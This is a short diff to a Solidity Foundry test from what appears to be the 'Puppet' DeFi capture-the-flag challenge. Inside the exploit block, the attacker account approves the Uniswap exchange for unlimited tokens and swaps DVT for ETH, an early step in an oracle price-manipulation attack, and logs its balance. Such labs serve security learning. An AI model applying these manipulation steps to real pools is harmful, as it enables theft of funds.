@@ -121,7 +121,8 @@ contract Puppet is Test {
         /** EXPLOIT START **/
         vm.startPrank(attacker);
         dvt.approve(address(uniswapExchange), type(uint).max);
-        //uniswapExchange.tokenToEthSwapInput(9, 9e18, DEADLINE);
+        uniswapExchange.tokenToEthSwapInput(9, 1e18, DEADLINE);
+        console.log(address(attacker).balance);
         vm.stopPrank();
         /** EXPLOIT END **/
         validation();
